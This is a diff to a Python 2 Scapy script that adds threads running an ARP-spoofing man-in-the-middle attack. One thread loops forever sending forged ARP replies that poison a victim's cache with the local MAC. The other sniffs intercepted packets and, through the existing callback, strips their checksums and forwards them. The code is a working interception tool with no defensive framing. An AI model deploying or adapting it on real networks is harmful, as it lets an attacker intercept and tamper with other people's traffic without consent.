@@ -3,7 +3,17 @@ import subprocess, shlex
 from scapy.all import *
 import sys
 from uuid import getnode as get_mac
+import threading
 
+
+def example(argv_0):
+	while 1:
+		send(ARP(op=2, pdst=Senderip, psrc=Receiverip, hwdst=Sendermac, hwsrc=Mymac))
+		time.sleep(5)
+
+def testf():
+	sniff(prn=pkt_callback, lfilter=lambda d: d.dst == Mymac, store=1)
+	
 #Myip= "192.168.218.174"
 #Mymac = "00:0c:29:d7:80:2d"
 #Senderip = "192.168.218.151"
@@ -25,8 +35,6 @@ def pkt_callback(pkt):
 	#pkt.display()
 	#if not (((pkt[Ether].src==Sendermac)and(pkt[Ether].dst==Mymac))or((pkt[Ether].dst==Mymac)and(pkt[Ether].src==Receivermac))):
 	#	return
-	if pkt[Ether].dst!=Mymac:
-		return
 
 	if ARP in pkt:
 		return
@@ -38,7 +46,6 @@ def pkt_callback(pkt):
 			del pkt[UDP].chksum
                         del pkt[UDP].len
                         del pkt.chksum
-                        print "send"
                         pkt = pkt.__class__(str(pkt))
                         sendp(pkt)
 
@@ -50,7 +57,6 @@ def pkt_callback(pkt):
 			del pkt[UDP].chksum
                         del pkt.chksum
                         pkt = pkt.__class__(str(pkt))
-                        print "send"
                         sendp(pkt)
 
 	else :
@@ -64,7 +70,6 @@ def pkt_callback(pkt):
 			#print pkt.show2()
 			pkt = pkt.__class__(str(pkt))
 			#ipkt.display()
-                        print "send"
 
 			sendp(pkt)
 			#print "send!!!"	
@@ -77,7 +82,6 @@ def pkt_callback(pkt):
                         #del pkt[TCP].chksum
                         del pkt.chksum
                         pkt = pkt.__class__(str(pkt))
-                        print "send"
 
                         sendp(pkt)
 
@@ -107,7 +111,13 @@ Sendermac=result[0][1].hwsrc
 print "Senderip : "+Senderip+" Sendermac : "+Sendermac
 
 
+th = threading.Thread(target=example, args=('hi',))
+th1 = threading.Thread(target=testf, args=()) 
+th.start()
+th1.start()
+th.join()
+th1.join()
 
 DefFilter = "host "+Receiverip+" or host "+Senderip
 print "hello"
-sniff(prn=pkt_callback, lfilter=lambda d: d.dst == Mymac, store=1)
+#sniff(prn=pkt_callback, lfilter=lambda d: d.dst == Mymac, store=1)
